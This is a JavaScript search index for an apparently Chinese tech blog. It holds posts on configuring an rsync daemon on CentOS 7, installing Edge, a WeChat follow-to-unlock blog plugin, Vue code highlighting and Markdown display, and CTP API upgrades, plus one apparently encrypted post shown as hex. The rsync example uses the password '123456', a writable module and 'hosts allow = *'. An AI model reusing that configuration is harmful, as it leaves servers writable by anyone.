"use strict";var tipuesearch={pages:[{title:"Centos7 使用 Rsync 同步文件",url:"/posts/a8ab361e.html",text:'前言Rsync 是一个增量备份工具，可压缩数据传输，速度快且增量备份，占用流量少。 准备工作创建用户12345# 创建用户组# groupadd www# 创建用户# useradd -g www www -s /bin/false 创建配置文件12# 创建Rsync服务器信息提示文件# echo "Welcome To Access" &gt; /etc/rsyncd.motd 123456# 创建Rsync服务器密码文件，其中 RsyncUser 是用户名，123456 是密码# echo "RsyncUser:123456" &gt; /etc/rsyncd.secrets# Rsync服务器密码文件授权，所属的用户和用户组必须都是 root，同时权限必须为 600# chown root:root /etc/rsyncd.secrets# chmod 600 /etc/rsyncd.secrets 安装 Rsync安装 Rsync 服务12345# 安装#&nbsp;yum install rsync# 开机自启动# systemctl enable rsyncd 注意 这里还需要更改 systemd 的配置文件，加入以下内容，否则 Rsync 服务开机无法正常自启动。 12345678# 更改systemd的配置文件，加入以下内容# vim /usr/lib/systemd/system/rsyncd.service[Unit]...After=network.target# 让配置文件生效# systemctl daemon-reload 配置 Rsync 服务12345# 备份默认的配置文件# cp /etc/rsyncd.conf /etc/rsyncd.conf.bak# 编辑配置文件，添加以下内容（请自行根据实际情况更改对应的配置内容）# vim /etc/rsyncd.conf 1234567891011121314151617181920212223242526272829303132333435363738394041424344# 设置服务器信息提示文件名称，在该文件中编写提示信息motd file = /etc/rsyncd.motd# 开启Rsync数据传输日志功能transfer logging = yes# 设置日志文件名称，可以通过log format参数设置日志格式log file =/var/log/rsyncd.log# 设置Rsync进程号保存文件名称pid file =/var/run/rsyncd.pid# 设置锁文件名称lock file =/var/run/rsync.lock# 设置服务器监听的端口号，默认为873 port = 873# 设置服务器所监听网卡接口的IP地址（内网IP）address = 172.0.25.18# 设置进行数据传输时所使用的账户名称或ID号，默认使用nobody uid = www# 设置进行数据传输时所使用的组名称或GID号，默认使用nobody gid = www# 设置user chroot为yes后，rsync会首先进行chroot设置，将根映射到path参数路径下，对客户端而言，系统的根就是path参数所指定的路径。但这样做需要root权限，并且在同步符号连接资料时仅会同步名称，而内容将不会同步。 use chroot = no# 是否允许客户端上传数据，这里设置不为只读。 read only = no# 设置并发连接数，0代表无限制。超出并发数后，如果依然有客户端连接请求，则将会收到稍后重试的提示消息 max connections = 10# 模块，Rsync通过模块定义同步的目录，模块以[name]的形式定义，这与Samba定义共享目录是一样的效果，在Rsync中也可以定义多个模块[blog]# comment定义注释说明字串 comment = rsync blog files# 同步目录的真实路径通过path指定 path = /home/www/blog# 忽略一些IO错误 ignore errors# exclude可以指定例外的目录，即将common目录下的某个目录设置为不同步数据 # exclude = test/ # 设置允许连接服务器的账户，账户可以是系统中不存在的用户 auth users = RsyncUser# 设置密码文件名称，注意该文件的权限要求为只读，建议权限为600，仅在设置auth users参数后有效 secrets file = /etc/rsyncd.secrets# 设置允许哪些主机可以同步数据，可以是单个IP，也可以是网段，多个IP与网段之间使用空格分隔 hosts allow = *# 设置拒绝所有（除hosts allow定义的主机外） # hosts deny = *# 客户端请求显示模块列表时，本模块名称是否显示，默认为true list = true 启动 Rsync 服务12345# 启动服务# systemctl start rsyncd# 查看服务的运行状态# systemctl status rsyncd 值得一提的是，还可以使用以下命令管理 Rsync 服务： 12345# 关闭服务# systemctl stop rsyncd# 重启服务# systemctl restart rsyncd 配置系统防火墙12345678# 开放Rsync监听的端口（默认端口是873）# firewall-cmd --permanent --add-port=873/tcp# 让防火墙规则生效# firewall-cmd --reload# 查看所有开放的端口# firewall-cmd --list-ports 测试文件同步服务提示 在下述的案例里，各命令参数的说明如下： 183.242.11.186：服务器的 IP 地址 blog：在 /etc/rsyncd.conf 配置文件中定义的模块名称 RsyncUser：在 /etc/rsyncd.secrets 配置文件中定义的用户名 --delete：表示同步文件时，删除目标目录比源目录多余的文件 同步目录授权在服务器上，确保用户拥有在 /etc/rsyncd.conf 配置文件中定义的 path 同步目录的访问权限。 12# 同步目录授权# chown -R www:www /home/www/blog 客户端同步服务器文件到本地12345# 客户端同步服务器的某个文件到本地$ rsync -vzrtopg --progress RsyncUser@183.242.11.186::blog/index.html ./# 客户端同步服务器的某个目录到本地$ rsync -vzrtopg --progress RsyncUser@183.242.11.186::blog/posts/ ./posts/ 客户端同步本地文件到服务器12345678# 客户端同步本地的某个文件到服务器$ rsync -rlptDv index.html RsyncUser@183.242.11.186::blog/# 客户端同步本地的某个目录到服务器（本地的目录路径必须不以\'/\'结尾）$ rsync -avzP --delete ./posts RsyncUser@183.242.11.186::blog/# 客户端同步本地某个目录下的所有文件到服务器（本地的目录路径必须以\'/\'结尾）$ rsync -avzP --delete ./posts/ RsyncUser@183.242.11.186::blog/ 设置同步时不手动输入密码在客户端同步文件时指定密码文件，这样可以避免每次都手动输入密码。 123456# 在本地创建密码文件，其中 123456 是密码，这里不需要指定用户名# echo "123456" &gt; /etc/rsyncd.password# 密码文件授权，所属的用户和用户组必须都是 root，同时权限必须为 600# chown root:root /etc/rsyncd.password# chmod 600 /etc/rsyncd.password 12# 客户端同步服务器的某个文件到本地（指定密码文件）# rsync -vzrtopg --progress RsyncUser@183.242.11.186::blog/index.html ./ --password-file=/etc/rsyncd.password 提示 除了上述的方法之外，还可通过设置环境变量的方式，避免每次都手动输入密码。 12345# 通过环境变量设置密码# export RSYNC_PASSWORD="123456"# 客户端同步服务器的某个文件到本地# rsync -vzrtopg --progress RsyncUser@183.242.11.186::blog/index.html ./ 不同步文件的所有者和用户组信息在 rsync -a dir/ remote:/dir/ 命令中，-a 相当于 -rlptgoD，各参数选项的说明如下： 123456789-o, --owner preserve owner (super-user only)-g, --group preserve group-r, --recursive recurse into directories-l, --links copy symlinks as symlinks-p, --perms preserve permissions-t, --times preserve modification times-D same as --devices --specials --devices preserve device files (super-user only) --specials preserve special files 若希望不同步文件的所有者和用户组信息，那么可以通过移除 -o 和 -g 参数选项来实现，示例命令如下： 1$ rsync -a --no-o --no-g dir/ remote:/dir/ 用参数控制 Rsync 同步时的比较算法Rsync 默认只会比较文件大小和最后修改时间，只要这两者一样，Rsync 就认为文件相同；此时如果其它属性（包括文件内容）的不同，并不会让 Rsync 同步该文件。所以，如果本地文件与远程文件大小一样，修改时间也一样，那么默认情况下，即使文件内容不一样的文件也不同被同步。通过设置合适的参数，可以控制 Rsync 的比较算法，其中 Rsync 使用以下三个步骤来比较文件： a) 比较文件大小 b) 比较文件最后修改日期 c) 比较文件内容，通过 checksum，例如使用 md5sum 可以用参数来控制 Rsync 执行上面的哪些步骤： 默认的比较算法只执行 a 和 b 参数 --size-only 只检查 a ，即只要文件大小一样，即使修改日期不一样，就认为文件一样，更不会去检查文件内容 参数 --ignore-times 是忽略所有检查，直接认为文件都不一样，然后总是复制文件 参数 --checksum 是在 a 的基础上执行 c ，比较文件内容。如果文件大小不一样，可以确保内容不一样。如果文件大小一样，那么直接比较文件内容，不会执行 b 中的比较最后修改时间。该方法最安全，但需要读取两边的文件内容，某些情况下要慢很多（尤其是最后比较出来的文件内容一样的情况） 命令参数的使用示例如下： 1$ rsync -avzP --delete --checksum dir/ remote:/dir/ 常见问题delete 参数不生效 Rsync –delete option doesn’t delete files in target directory var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"Centos7 安装 Edge 浏览器",url:"/posts/350db602.html",text:'下载在 Edge 的 官网，手动下载最新版的 RPM 安装包，或者使用以下命令进行下载： 1$ wget https://packages.microsoft.com/yumrepos/edge/microsoft-edge-dev-101.0.1193.0-1.x86_64.rpm 安装依赖1# yum install libatomic 提示 若不提前安装 libatomic 库，则安装 Edge 时会出现以下错误信息。 123错误：依赖检测失败： libatomic.so.1()(64bit) 被 microsoft-edge-dev-101.0.1193.0-1.x86_64 需要 libatomic.so.1(LIBATOMIC_1.0)(64bit) 被 microsoft-edge-dev-101.0.1193.0-1.x86_64 需要 安装 Edge 浏览器1# rpm -ivh microsoft-edge-dev-101.0.1193.0-1.x86_64.rpm var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"Hexo 博客导流微信公众号",url:"/posts/c86372a2.html",text:"前言Hexo 博客建议安装 hexo-readmore 插件，将 TechGrow 的免费微信公众号导流工具整合到博客中，用户扫码关注微信公众号后可以解锁全站文章，让微信公众号的粉丝数躺着增长。 特色 适配绝大多数的 Hexo 主题 支持关闭某篇文章的导流功能 支持随机为博客添加导流功能 支持查询用户解锁阅读文章的历史记录 注册博客浏览器访问 TechGrow 的官网，注册并登录账号后，进入博客的后台管理页面。首先点击左侧的菜单 博客注册，然后点击 新增 按钮，添加自己博客的信息。博客注册成功后，记录下博客 ID，后面的步骤会使用到 设置公众号在微信公众号的后台管理页面，菜单栏里选择 自动回复 - 关键词回复，启用 自动回复，然后点击 添加回复 按钮： 填写 规则名称、关键词（当初你在 TechGrow 中设置的）、回复内容 选择 文字，然后 回复文字 的内容填写获取博客解锁验证码的链接，如下所示（请自行更改 xxxxx-xxxxxxxxx-xxx 为你申请到的博客 ID） 1&lt;a href=\"https://open.techgrow.cn/#/readmore/captcha/generate?blogId=xxxxx-xxxxxxxxx-xxx\"&gt;点击链接，获取博客解锁验证码&lt;/a&gt; 此时，当读者关注你的微信公众号，并输入关键词后（比如我设置的关键词就是 tech），那么读者就会自动接收到获取博客解锁验证码的链接 安装插件 运行 npm install 命令安装插件到本地项目 1$ npm install hexo-readmore --save 配置 Hexo编辑 Hexo 的 _config.yml 配置文件，新增插件的配置信息（请自行更改博客相关的信息），如下所示： 12345678readmore: enable: true # 是否启用，默认否 blogId: '18762-1609305354821-257' # 已申请的博客 ID name: '全栈技术驿站' # 已申请的微信公众号名称 keyword: 'Tech' # 已申请的微信公众号回复关键词 qrcode: 'https://www.techgrow.cn/img/wx_mp_qr.png' # 已申请的微信公众号二维码链接 # libUrl: 'https://qiniu.techgrow.cn/js/readmore.js' # CDN 加速链接（可选） # random: 0.8 # 每篇文章随机添加微信公众号导流工具的概率，有效范围在 0.1 ~ 1 之间，1 则表示所有文章默认都自动添加导流工具（可选） 或者打开 TechGrow 的博客后台管理页面，点击博客列表中右侧的 使用 链接，将窗口里的 YML 配置内容复制到 Hexo 的 _config.yml 配置文件即可 构建 Hexo 运行 hexo clean 命令清理本地博客 1$ hexo clean 运行 hexo generate 命令构建本地博客 1$ hexo generate 运行 hexo server 命令启动本地博客服务 1$ hexo server 验证插件效果打开文章页面，若文章自动隐藏了部分内容，并且出现了 阅读全文 按钮，则说明导流插件正常运行，如下图所示： 点击 阅读全文按钮，会弹出微信公众号的二维码窗口，如下图所示： 取消阅读限制若希望关闭某篇文章的微信公众号导流功能，可以在文章的头模板中使用 readmore: false 配置属性，如下所示： 12345678---title: Hexo版本升级教程tags: [Hexo]readmore: falsekeywords: [Hexo, 版本升级]date: 2022-01-12 22:25:49updated: 2022-01-12 22:25:49--- 在线演示案例 官方博客 手动整合导流工具若有特殊的使用要求，你还可以手动为博客整合微信公众号导流工具，这样就可以不使用 Hexo 插件了，详细教程可以点击 这里。 官方微信群（提供技术支持）",tags:"静态博客"},{title:"博客导流微信公众号",url:"/posts/48b470db.html",text:'前言博客将流量导向微信公众号很简单，可以使用 TechGrow 的免费导流工具实现，用户扫码关注微信公众号后可以解锁全站文章，让微信公众号的粉丝数躺着增长。整个过程只需六步就可以搞定，适用于各类主流的博客，本文以 Hexo 的 NexT 主题博客举例。 提示 若使用的是 Hexo 静态博客，建议直接安装 hexo-readmore 插件，将微信公众号导流工具快速添加到 Hexo 博客中，详细教程可点击这里。 第一步：注册博客浏览器访问 TechGrow 的官网，注册并登录账号后，进入博客的后台管理页面。首先点击左侧的菜单 博客注册，然后点击 新增 按钮，添加自己博客的信息。博客注册成功后，记录下博客 ID，后面的步骤会使用到 第二步：设置微信公众号自动回复在微信公众号的后台管理页面，菜单栏里选择 自动回复 - 关键词回复，启用 自动回复，然后点击 添加回复 按钮： 填写 规则名称、关键词（当初你在 TechGrow 中设置的）、回复内容 选择 文字，然后 回复文字 的内容填写获取博客解锁验证码的链接，如下所示（请自行更改 xxxxx-xxxxxxxxx-xxx 为你申请到的博客 ID） 1&lt;a href="https://open.techgrow.cn/#/readmore/captcha/generate?blogId=xxxxx-xxxxxxxxx-xxx"&gt;点击链接，获取博客解锁验证码&lt;/a&gt; 此时，当读者关注你的微信公众号，并输入关键词后（比如我设置的关键词就是 tech），那么读者就会自动接收到获取博客解锁验证码的链接 第三步：定位文章主体的标签元素在博客的 themes 目录下，找到你正在使用的主题目录，比如：next 等，具体根据你选择的主题来判断。进入主题的 layout 目录，找到 _macro/post.njk 模板文件，若这里有一大段与文章主体内容相关的 HTML 代码，那就说明文章的模板定义就在这里，示例模板代码如下： 1234567891011121314151617&lt;div class="post-block"&gt; {# Gallery support #} {{ post_gallery(post.photos) }} &lt;article itemscope itemtype="http://schema.org/Article" class="post-content" lang="{{ post.lang }}"&gt; &lt;link itemprop="mainEntityOfPage" href="{{ post.permalink }}"&gt; &lt;span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"&gt; &lt;meta itemprop="image" content="{{ url_for(theme.avatar.url or theme.images + \'/avatar.gif\') }}"&gt; &lt;meta itemprop="name" content="{{ author }}"&gt; &lt;meta itemprop="description" content="{{ description }}"&gt; &lt;/span&gt; ...（省略） &lt;/article&gt;&lt;/div&gt; 另一种查看方式是打开你博客的任意一篇文章，利用 Chrome 等浏览器的元素审查功能，找到文章页面中文章主体的标签元素，比如下图中的 article 就是整篇文章的主体标签元素： 第四步：新增文章内容的 DIV 标签在文章模板文件中找到文章主体的标签元素之后，在其上一层包一层 div 标签，并将 div 标签的 id 属性设置为 readmore-container，即添加的 HTML 标签为 &lt;div id="readmore-container"&gt;，示例模板代码如下： 12345678910111213141516171819&lt;div class="post-block"&gt; {# Gallery support #} {{ post_gallery(post.photos) }} &lt;div id="readmore-container"&gt; &lt;article itemscope itemtype="http://schema.org/Article" class="post-content" lang="{{ post.lang }}"&gt; &lt;link itemprop="mainEntityOfPage" href="{{ post.permalink }}"&gt; &lt;span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"&gt; &lt;meta itemprop="image" content="{{ url_for(theme.avatar.url or theme.images + \'/avatar.gif\') }}"&gt; &lt;meta itemprop="name" content="{{ author }}"&gt; &lt;meta itemprop="description" content="{{ description }}"&gt; &lt;/span&gt; ...（省略） &lt;/article&gt; &lt;/div&gt;&lt;/div&gt; 第五步：新增导流工具的 HTML 代码打开 TechGrow 的博客后台管理页面，点击博客列表中右侧的 使用 链接，将窗口里的 HTML 代码复制到第三步中找到的文章模板文件的末尾，也可以添加到主题的 footer 模板文件中，示例 HTML 代码如下图所示： 参数说明 id：div 标签的 ID blogId：已申请的博客 ID name: 已申请的微信公众号名称 qrcode: 已申请的微信公众号二维码链接 keyword：已申请的微信公众号回复关键词 random：每篇文章随机添加微信公众号导流工具的概率，有效范围在 0.1 ~ 1 之间，1 则表示所有文章默认都自动添加导流工具（可选） 第六步：验证导流工具是否正常运行重新构建并运行博客服务后，打开文章页面，若文章自动隐藏了部分内容，并且出现了 阅读全文 按钮，则说明导流工具整合成功，如下图所示： 点击 阅读全文按钮，会弹出微信公众号的二维码窗口，如下图所示： 官方微信群（提供技术支持）',tags:"静态博客"},{title:"Vue 页面高亮显示代码块",url:"/posts/5cf75f16.html",text:'前言Vue 页面可以基于 vue-prism-editor 实现高亮显示代码块，支持 Vue 2.x 和 Vue 3.x。 提示 vue-prism-editor 要求 Vue 的版本高于 2.6.11 若 Vue 的版本为 3.x，则需要使用 vue-prism-editor 的 feature/next 分支代码 安装模块1$ npm install vue-prism-editor --save 由于 vue-prism-editor 依赖了 prismjs，所以还需要安装 prismjs 1$ npm install prismjs --save Vue 代码在 Vue 页面中引入 vue-prism-editor 组件，完整的示例代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;template&gt; &lt;prism-editor class="my-editor height-300" v-model="code" :highlight="highlighter" readonly line-numbers&gt;&lt;/prism-editor&gt;&lt;/template&gt;&lt;script&gt; // import Prism Editor import { PrismEditor } from \'vue-prism-editor\' import \'vue-prism-editor/dist/prismeditor.min.css\' // import highlighting library import { highlight, languages } from \'prismjs/components/prism-core\' import \'prismjs/components/prism-clike\' import \'prismjs/components/prism-javascript\' import \'prismjs/themes/prism-tomorrow.css\' export default { components: { PrismEditor }, data: () =&gt; ({ code: \'console.log("Hello World")\' }), methods: { highlighter (code) { return highlight(code, languages.js) } } }&lt;/script&gt;&lt;style&gt; /* required class */ .my-editor { /* we dont use `language-` classes anymore so thats why we need to add background and text color manually */ background: #2d2d2d; color: #ccc; /* you must provide font-family font-size line-height. Example: */ font-family: Fira code, Fira Mono, Consolas, Menlo, Courier, monospace; font-size: 14px; line-height: 1.5; padding: 5px; } /* optional class for removing the outline */ .prism-editor__textarea:focus { outline: none; } /* not required: */ .height-300 { height: 300px; }&lt;/style&gt; 提示 highlighter：定义在 methods 中的一个方法，用于将代码高亮显示 readonly：代码块是否只读（不可编辑） code：需要高亮显示的代码内容 lineNumbers：是否显示行号 演示效果 常见问题问题一如果安装 NPM 模块失败，且错误信息中有提示升级 vue@^2.6.11 版本，则根据提示升级 Vue 的版本即可： 1$ npm install vue@^2.6.11 问题二vue 与 vue-template-compiler 的版本不一致，导致 Vue 项目编译失败 首先卸载低版本的 vue-template-compiler 1$ npm uninstall vue-template-compiler 然后安装跟 vue 相同版本的 vue-template-compiler 1$ npm install vue-template-compiler@2.6.11 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"前端"},{title:"Vue 页面读取并展示 Markdown 文件",url:"/posts/df920f01.html",text:'前言如何在 Vue 中读取项目本地的 MarkDown 文件并展示在网页上呢？查阅资料后发现，一般的方案是在 Vue 页面中引入 Markdown 编辑器，然后利用编辑器的预览功能来展示 MarkDown 文件的内容。推荐使用开源的 MarkDown 编辑器 mavonEditor 或者 vue-meditor。 vue-meditor 介绍简介提示 vue-meditor 官方文档 vue-meditor Github 仓库 vue-markdown 是一款使用 marked 和 highlight.js 开发的一款 MarkDown 编辑器，主要包括三个部分： 简单版编辑器，左侧文本输入框使用 textarea 实现 专业版编辑器，左侧输入框使用 codemirror 实现 MarkDown 预览组件，可单独使用 显示效果图 vue-meditor 使用使用 NPM 安装1$ npm i -S vue-meditor 在项目中引入组件在 Vue 页面中引入 vue-meditor 的预览组件 MarkdownPreview，完整示例代码如下，编辑器的完整基本属性可查阅 官方文档 1234567891011121314151617181920212223242526272829303132333435&lt;template&gt; &lt;div class="markdown"&gt; &lt;MarkdownPreview v-model="content" :height="1024" :isPreview=true :bordered=false :copyCode=true theme="oneDark" /&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import MarkdownPreview from \'vue-meditor\' export default { name: \'markdown\', data () { return { content: \'\' } }, components: { MarkdownPreview }, created () { // 读取本地的Markdown文件 this.$http.get(\'/static/guide/start.md\').then((response) =&gt; { if (response.data) { this.content = response.data } }) } }&lt;/script&gt; 值得一提的是，/static/guide/start.md 是 Vue 项目根目录下 MarkDown 文件的路径，上面的代码通过 HTTP 请求去读取 Markdown 文件，这样的优势是可以实时预览 MarDown 文件的内容。 最终实现的效果图 参考资料 Vue 使用 MarkDown Vue 读取本地 MarkDown 文件 Vue 读取展示 MarkDown 文件 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"前端"},{title:"CTP 开发随笔",url:"/posts/790d6d80.html",text:'API 版本升级提示 CTP API 版本说明 CTP API 各版本官方下载 下面将以 v6.3.15 版本升级到 v6.6.1_P1 版本举例，同样适用于将 v6.3.19_P1 版本升级到 v6.6.1_P1 第一步从官网下载 v6.6.1_P1_20210406 版本的 API，然后解压并将 .h 头文件和 .DLL 文件拷贝到 C/C++ 项目里；也就是说，将原有的 API 文件替换掉即可。 第二步v6.6.1_P1 相比 v6.3.15，其中一个不同的地方，就是函数里的结构体名称更改了。因此需要在 IDE 里全局将 CThostFtdcQueryMaxOrderVolumeField 替换为 CThostFtdcQryMaxOrderVolumeField，同时将 ReqQueryMaxOrderVolume 替换为 ReqQryMaxOrderVolume。 第三步由于 v6.6.1_P1 版本新增了一些函数，若项目的代码是基于官方的 Demo 进行二次开发的，那么则需要在下述的 C++ 源文件末尾追加以下代码： traderApi.h 1234567891011///请求查询分类合约virtual int ReqQryClassifiedInstrument(CThostFtdcQryClassifiedInstrumentField *pQryClassifiedInstrument, int nRequestID);///请求组合优惠比例virtual int ReqQryCombPromotionParam(CThostFtdcQryCombPromotionParamField *pQryCombPromotionParam, int nRequestID);///投资者风险结算持仓查询virtual int ReqQryRiskSettleInvstPosition(CThostFtdcQryRiskSettleInvstPositionField *pQryRiskSettleInvstPosition, int nRequestID);///风险结算产品查询virtual int ReqQryRiskSettleProductStatus(CThostFtdcQryRiskSettleProductStatusField *pQryRiskSettleProductStatus, int nRequestID); traderApi.cpp 123456789101112131415int CTraderApi::ReqQryClassifiedInstrument(CThostFtdcQryClassifiedInstrumentField *pQryClassifiedInstrument, int nRequestID) {};int CTraderApi::ReqQryCombPromotionParam(CThostFtdcQryCombPromotionParamField *pQryCombPromotionParam, int nRequestID) {};int CTraderApi::ReqQryRiskSettleInvstPosition(CThostFtdcQryRiskSettleInvstPositionField *pQryRiskSettleInvstPosition, int nRequestID) {};int CTraderApi::ReqQryRiskSettleProductStatus(CThostFtdcQryRiskSettleProductStatusField *pQryRiskSettleProductStatus, int nRequestID) {}; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发随笔 量化交易"},{title:"学习与开发计划",url:"/posts/29d74d90.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299b6490ac25c35cdeb830b4ba7a9cf2685b51e73c35435eed90a9068092b489c658fbe5dcd9120430b53303db25dd1379e7a2449eb637d00d83919247d51fcb0dc0b707ffe48aed6172669d04db67a24d5dde7296bd85769b52c16c28aa39d11d5500bf6e3946171d371e41de3718488ac6d45e54830e5e9ca1135ba9253cdb40bf491fc90d6bebde2b44be824f3fe5570b00526238398e0d897baaa8c802561f79af615620bf788139180f0b667843781077236708681051428699d7381ed1ec5f650ca0fae4c321d45d425685a8d2fac0d0b4706ecc6e249dbfca7cbed1d19a9ba75e145ae2f9c81e35441098e2a41f9f5e00162fd51818e629ebf83f1648cb6a256c6d7fa314b33c47b17bee5cd167925038b5486a8cbb412370dc37327bff36a6e66280e6a7a8fc1dfc7a8eb1ab1e94e918645e8b735a689f900822632ebc96db863fecdb47e67cc7e55276808b64a17798dfbaa221c25d902ac79ebe1668eed061e1777d4dc21f949bba0e77130f63ad4c6d0d528b033af0af5462fa2e373838a2df9275a7e01d6d5930e9fee5605b3d79d78532ca7b38f2fc44d8e0f0ea31282cebe47e482eae582315648298850b543a9d143fa9af1cdfed3c85737fd853cc50228c877325d71c00ed029181690317cb0d075199eb4878330a18119b5fe3522c62f5b147c3b87d0296a32303a58d11509cbc7715997271ad7f7713a48c2c2f5a79b7648524adaf543a4882e3d81f0ee1aee9c5bff201b9f7037b17dfca35d239d6af92f86189eaf1526b0c4621ef62a38b71b84502a9c83fc8febe63070d6b0dea8b27a9c7719b2c96277d0fa75099093fdc8029102355473a954481e62bf26927556337119359ebdbaff219c4cb47c0f44d07724dc915878d02326aead7e7af6505b597470a8aa3cbc660fd74199556820917b4dba7b69a6d452d912baf80d327ed0b1cdb6fefb22e79507459c6a50a2a30a83c6e9ab41f94b4031ec2a82e5aa05b74fba0025fd160c9774983920573cf227224b90440133a1205521596ba736c653c7a52c01757e8f8fa9598707b46f67a49461e9af3c07ec3f724f84e05d3d4cf79ab604854c2bbe7a415cb7dd71ffe25f74d167089acb531e24d779abe169e74bd99cea1fcf1eac18331519dc213ba9d7ea16e4e0fddf5945b59af0d31bd2f28791777d50e4fb9c0778b3ac868b53d2dd133f498ea2eeb079533f3903592995fdcca5084ce4382c6f417ae54251f4eb1643f64212f2bbd91ad24b3a8d06ba33c4c1336dbc1a867361523e0f89d8000cf8c905691047dbb139fc3b89a99901e406dab9306802838fa18c821fabd55bb3e2dbb5136298bf0d36488876f8e233f7eb0219730eb350bba99f628d54541b5f2f934879eb1927a35a58b101a6377eae380f409a9a7cde4e1924561ccbf1e60e98439fa6f39964ceb64074822205f82afb8bbc1db7d6cbbfce80543169fce6f5b36d416d9c0411f498530c48f214b4cbef1aafa74797ad2e94407eb5130ece57855f03a9fde789b3ed3cabcc2d78b0549d732413a4c8f62a821e99f22eb8412194d597329a707b40fbb28e01284bf214d3ebc08af91b08dc8154fec4628c15eb272bfffeb27328f0588f99708e3eac75834323b4c32c004ef65f4c1dbf1b6b3da4933b2396b3d52ef0ffcec1a5070ca38fc0afc68f82bef082d91c077039f6fbbc8382dffe941e58dadbac06a2f9f53da8a6fe0fbf3950b9247d7a96c131a6ffc321f6c7b24b29e4ec6fe564e14557fe1365045aab4289d1de6a06254c120ad66148d25256ddb8a7df41ceeb4129e9bbdb6d3c472908f0d8e7841cceb6220a2d68364be92071625cb5ec035790caa7faeb3295ab4fc0d163bfa0c2329145003c19eb32028d1e57530875e3a28d33c68f227058686f502278347d2afc3c0b306d450d022c988717bc0918c6064e1fbf2ed084da11fc54c5ac02c4c97f52c2f40e417a5ca33e96b5254a23ea34f2f231e15da41b9bea11462ed6150f81fcd0f33147757e476430b403b68b4a6e23f0519fc162148d9e6a0ec690ab1800c15f169e5f14f3c17c5462ee897966a940ae4db94d5717bcd367f517e68dbeadef56fec8ed6fc1190a6d310117814de326b8aee2a9003d4f53b9b5c1f9db994a1129668a2ae3b48c041fa2f8e96f14e4e21bbc2a04169cb8b8259de8ed1d3a2ce4359182de14bc520a33d7f1db7038e1a0acdea8722b2dca69484945c18e081b8d50483b3222327f3b59db7eb7fdf8272a1d9d64f537ce93f3f96941b4cb9f5a14c77a526be6e0502ad5999ea649f0c44faed6ef2aad5a5818c017961d904c3ece7183e016264b76001727e687dd34cf13c73b21b1d94dd145f5340adf50e6afadadf1974b24305b572b30acc38a229e4f733aca245468d8fc981579cc9e604a5c6d8f731c3054b69006c3a249501a6764edd4f4eb7139a1e9417ddca40339819672c2521184de058ca6075e2817c3d23db8d136bb7fab9410e96711f7ca2363d54a65443dd49a602ea53e972a5791b2aa75b257e07cf1e691b342d9ca1f0e88a871c915f26595e60d32610f808fcf7050a436fc4fcf597b040cfb911b81e9fef2da244a37954a621e112e77abd5179afa6ff3acf86f4b3fc74da75c831dabc24d7abc48c12ea5833ebd4a2f99786695ab4d11f47e5b7dbc92887474fa89937291e570eba032b53bcbcbfe294b28e40bc21f9742a3acc5241de9a8357a4d93e693bb96b12cfe454a9e9ec36519e65a27c5db191d0cccc0dff08cedc41bcb56d0fd3970aa68d3feb00948651ba4ba3eccf5ea5750b7377aa04f79d72d5ea048ac733032a203c3fba2ea37f62592bd4a182fb419a71552522b35e8c95042438ce9c6984b3c0590cbc6b1d3c230abce7a6b7656e1b4a0a4973ca9994c3b12fc1489a4274ffb67ef05303e4e33d21c8861785e08d1be94947b00a62a2f792886a6c941ae35482c3093148652643a8a28425d6b6631a1527f1dd898f867812517465ece9261e1a7e59e7e1623da56ee9be43345f1eea92eebeea5026871ffb5c7f9a533eac6397e6264573007e498350e596f9725067a14215928dd2e6d3c84ffd36cf81080d62f49dc1cc3d85eacd